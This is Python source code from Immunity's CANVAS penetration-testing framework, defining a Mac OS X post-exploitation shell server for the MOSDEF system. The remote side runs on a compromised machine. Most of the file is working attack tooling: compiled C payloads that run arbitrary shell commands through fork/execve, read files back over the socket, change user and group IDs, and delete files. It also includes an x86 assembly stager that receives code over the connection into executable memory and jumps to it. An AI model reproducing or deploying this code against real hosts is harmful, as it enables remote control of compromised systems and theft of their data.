#! /usr/bin/env python

# the new Mac OS X voodoo .. son

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
#
# http://www.immunityinc.com/CANVAS/ for more information

from mosdefutils import *
from MSSgeneric import MSSgeneric
from shellserver import unixshellserver
from MOSDEF.osxremoteresolver import x86osxremoteresolver

class OSXShellServer(MSSgeneric, unixshellserver):
    
    def __init__(self):
        self.O_RDONLY = self.libc.getdefine('O_RDONLY')
        self.O_RDWR = self.libc.getdefine('O_RDWR')
        self.O_CREAT = self.libc.getdefine('O_CREAT')
        self.O_TRUNC = self.libc.getdefine('O_TRUNC')
        
    def pwd(self):
        vars = {}
        code = """
        #import "local", "getcwd" as "getcwd"
        #import "local", "memset" as "memset"
        #import "local", "sendstring" as "sendstring"
        
        int main()
        {
          char buf[1024];
          memset(buf, 0, 1024);
          getcwd(buf, 1024);
          sendstring(buf);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readstring()
        self.leave()
        return ret
    
    def mkdir(self, path, mode=0777):
        vars = { 'path' : path, 'mode' : mode }
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "mkdir" as "mkdir"
        
        #import "string", "path" as "path"
        #import "int", "mode" as "mode"
        
        int main()
        {
          int ret;
          ret = mkdir(path, mode);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret       
        
    def runcommand(self, command):
        """
        runs a command via popen2
        """
        data = self.popen2(command)     
        return data
    
    def popen2(self, command):
        """
        run a command and get output
        """
        vars = {}
        vars['command'] = command
        
        code="""
        #import "string", "command" as "command"
        
        #import "local", "pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "memset" as "memset"
        #import "local", "waitpid" as "waitpid"
        #import "local", "sendstring" as "sendstring"
        
        void main()
        {
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          int ret;
          int pid;
          
          // pipes[0] is now for reading and pipes[1] for writing
          argv[0] = "/bin/sh";
          argv[1] = "-c";
          argv[2] = command;
          argv[3] = 0;
          
          // now we fork and exec and read from the socket until we are done
          ret = pipe(pipes);
          ret = pipe(bpipes);
          pid = fork(); // SEE SYSCALL SEMANTICS ON XNU!
          
          if (pid == 0) 
          {
            close(0);
            close(1);
            close(2);
            ret = dup2(pipes[0], 0);
            ret = dup2(bpipes[1], 1);
            ret = dup2(bpipes[1], 2);
            close(bpipes[0]);
            execve(argv[0], argv, 0); 
            exit(1);
          }
          ret = close(bpipes[1]);
          ret = close(pipes[0]);
          memset(buf,0,1001);
          
          while (read(bpipes[0], buf, 1000) != 0) 
          {
            sendstring(buf);
            memset(buf, 0, 1001);
          }
           
          //send blank string...
          sendstring(buf);
          close(pipes[1]);
          close(bpipes[0]);

          waitpid(-1,0,1); //wnohang is 1
          waitpid(-1,0,1); //wnohang is 1
        }
        """
        
        self.clearfunctioncache()         
        request = self.compile(code, vars)
        self.sendrequest(request)
        tmp = self.readstring()
        data = tmp
        while tmp != "":
            tmp = self.readstring()
            data += tmp
        self.leave()
               
        return data
    
    def getids(self):
        uid, euid, gid, egid = self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d" % (uid, euid, gid, egid)
    
    def setuid(self, uid):
        vars = { 'uid' : uid }
        code = """
        #import "local", "setuid" as "setuid"
        #import "local", "sendint" as "sendint"
        #import "int", "uid" as "uid"
        
        int main()
        {
          int ret;
          ret = setuid(uid);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    def setgid(self, gid):
        vars = { 'gid' : gid }
        code = """
        #import "local", "setgid" as "setgid"
        #import "local", "sendint" as "sendint"
        #import "int", "gid" as "gid"
        
        int main()
        {
          int ret;
          ret = setgid(gid);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    # same for ppc/i386 .. so dont need arch dependent header kludges ..
    def fstat(self, fd):

        vars = { 'fd' : fd }
        code = """
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","fstat" as "fstat"
        
        #import "int", "fd" as "fd"
        
        struct stat {
          unsigned long st_dev;
          unsigned long st_ino;
          unsigned short st_mode;
          unsigned short st_nlink;

          unsigned long st_uid;
          unsigned long st_gid;
          unsigned long st_rdev;

          unsigned long  st_atime;
          unsigned long  st_atimensec;
          unsigned long  st_mtime;
          unsigned long  st_mtimensec;
          unsigned long  st_ctime;
          unsigned long  st_ctimensec;
          unsigned long  st_size;
          unsigned long  st_blocks;
          unsigned long  st_blksize;
          unsigned long  st_flags;
          unsigned long  st_gen;
          
          // reserved area .. make it big to prevent overflows on stat
          // sometimes we dont know how this struct is gonna turn out
          // exactly .. so instead of squirreling around we just pad
          
          char _reserved[512];
        };
          
        void main()
        {
          int canary;
          struct stat buf;
          int ret;

          canary = 0x41414141;
          ret = fstat(fd, &buf);
          sendint(ret);
          sendint(canary);
          
          if (ret == 0) 
          {
            sendint(buf.st_dev);
            sendint(buf.st_ino);
            sendshort(buf.st_mode);
            sendshort(buf.st_nlink);

            sendint(buf.st_uid);
            sendint(buf.st_gid);
            sendint(buf.st_rdev);

            sendint(buf.st_atime);
            sendint(buf.st_atimensec);
            sendint(buf.st_mtime);
            sendint(buf.st_mtimensec);
            sendint(buf.st_ctime);
            sendint(buf.st_ctimensec);

            sendint(buf.st_size);
            sendint(buf.st_blocks);
            sendint(buf.st_blksize);
            sendint(buf.st_flags);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        canary = self.readint(signed=True)
        if canary != 0x41414141:
            print "XXX: OSX STAT CANARY CHIRPED! 0x41414141 vs. %X" % canary
        statbuf = None
        if ret == 0:
            statbuf = self.readstruct([("l","st_dev"),
                                     ("l","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("l","st_uid"),
                                     ("l","st_gid"),
                                     ("l","st_rdev"),
                                     ("l","st_atime"),
                                     ("l","st_atimensec"),
                                     ("l","st_mtime"),
                                     ("l","st_mtimensec"),
                                     ("l","st_ctime"),
                                     ("l","st_ctimensec"),
                                     ("l","st_size"),
                                     ("l","st_blocks"),
                                     ("l","st_blksize"),
                                     ("l","st_flags")])

        self.leave()
        return ret,statbuf
    
    def readfromfd(self, file_fd, len):

        vars = {}
        vars['len'] = len
        vars['sock_fd'] = self.fd
        vars['file_fd'] = file_fd
        
        code = """
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"
        
        #import "int", "len" as "len"
        #import "int", "sock_fd" as "sock_fd"
        #import "int", "file_fd" as "file_fd"

        void main () 
        {
          char buf[1000];
          int left;

          left = len;
          while (left > 1000) 
          {
            read(file_fd, buf, 1000); 
            writeblock(sock_fd, buf, 1000);
            left = left-1000;
          }
          if (left > 0) 
          {
            read(file_fd, buf, left); 
            writeblock(sock_fd, buf, left);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        data = self.readbuf(len)
        self.leave()
        return data
    
    def writetofd(self, fd, data):

        vars = {}
        vars['len'] = len(data)
        vars['sock_fd'] = self.fd
        vars['file_fd'] = fd

        code="""
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"        
        #import "int", "len" as "len"
        #import "int", "sock_fd" as "sock_fd"
        #import "int", "file_fd" as "file_fd"

        void main() 
        {
          char buf[1001];
          int left;

          left = len;
          while (left > 1000) 
          {
            readblock(sock_fd, buf, 1000); 
            write(file_fd, buf, 1000);
            left = left-1000;
          }
          if (left > 0) 
          {
            readblock(sock_fd, buf, left); 
            write(file_fd, buf, left);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()
        return
    
    def dounlink(self, file):
        ret = self.unlink(file) # from MSSsystem.py
        if not ret:
            return "%s was unlinked." % file
        else:
            return "%s was not unlinked due to some kind of error." % file
        
    def cd(self, dir):
        if self.chdir(dir) == -1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s" % (dir)
        
    def chdir(self, dir):
        vars = { 'dir' : dir }
        code = """
        #import "local", "chdir" as "chdir"
        #import "local", "sendint" as "sendint"
        #import "string", "dir" as "dir"
        
        int main()
        {
          int ret;
          ret = chdir(dir);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
class OSX_i386(OSXShellServer, x86osxremoteresolver):
    
    COMPILE_ARCH = 'X86'
    
    def __init__(self, connection, node, logfunction=None, proctype='i386'):
        x86osxremoteresolver.__init__(self) # now we have a libc ..
        OSXShellServer.__init__(self)
        unixshellserver.__init__(self, connection, type='Active', logfunction=logfunction)
        MSSgeneric.__init__(self, proctype)
        self.node = node
        self.node.shell = self
        self.started = 0
    
    def startup(self):        
        if self.started == True:
            return 0
        
        devlog('shellserver::startup', 'osx shellserver starting up ..')
        devlog('shellserver::startup', 'local: %s, remote: %s' % \
               (self.connection.getsockname(), self.connection.getpeername()))
        
        self.connection.set_timeout(None)
        
        # get the fd val .. left in ecx .. ebx is PIC code reg in OS X
        import MOSDEF.mosdef as mosdef
        import struct
        
        send_fd_mmap_loop = """
        andl $-16,%esp
        pushl %ecx // treat fd as a local arg
        movl %esp,%ebp
        
        pushl $4
        pushl %ebp
        pushl (%ebp)
        movl $4,%eax // convention: syscall # in eax, push eax, trap to kernel
        pushl %eax
        int $0x80
        
        addl $16,%esp
    
        pushl $0
        pushl $-1
        pushl $0x1002 // MAP_PRIVATE | MAP_ANON
        pushl $0x7
        pushl $0x4000 // assuming we wont have to allocate > 4 pages
        pushl $0
        movl $197,%eax
        pushl %eax
        int $0x80
        
        addl $28,%esp     
        pushl %eax
        
    recv_exec:
    
        pushl $0
        movl %esp,%eax
        pushl $4
        pushl %eax
        pushl (%ebp)
        movl $3,%eax
        pushl %eax
        int $0x80 // recv len
        
        addl $16,%esp        
        popl %ecx // get len
        popl %eax
        pushl %eax // save mmap base
        pushl %eax // edit mmap base

    read_loop:
        
        popl %eax
        pushl %eax
        pushl $1
        pushl %eax
        pushl (%ebp)
        movl $3,%eax
        pushl %eax
        int $0x80
        
        test %eax,%eax
        jz exit

        addl $16,%esp
        addl %eax,(%esp)
        
        loop read_loop
        
        popl %eax
        popl %eax // orig mmap base
        pushl %eax
        call *%eax        
        popl %eax // restore mmap base
        
        movl %ebp,%esp
        pushl %eax // place mmap base
        jmp recv_exec
        
    exit:
    
        xorl %eax,%eax
        pushl %eax
        incl %eax
        pushl %eax
        int $0x80
        """
            
        self.sendrequest(mosdef.assemble(send_fd_mmap_loop, self.COMPILE_ARCH))
        self.fd = struct.unpack('<L', self.connection.recv(4))[0]
        self.leave()
        
        self.set_fd(self.fd)
        
        self.libc.initStaticFunctions({'fd': self.fd}) # update libc functions that require fd val
        self.localfunctions = self.libc.localfunctions.copy() # update our rr copy of the libc
        self.initLocalFunctions()
        
        devlog('shellserver::startup', 'remote fd: %d' % self.fd)
        
        self.setInfo('OSX ShellServer started on: %s (remote fd: %d)' % \
                     (self.connection.getpeername(), self.fd))
        
        self.started = True
        return self.started
    
        
        
        
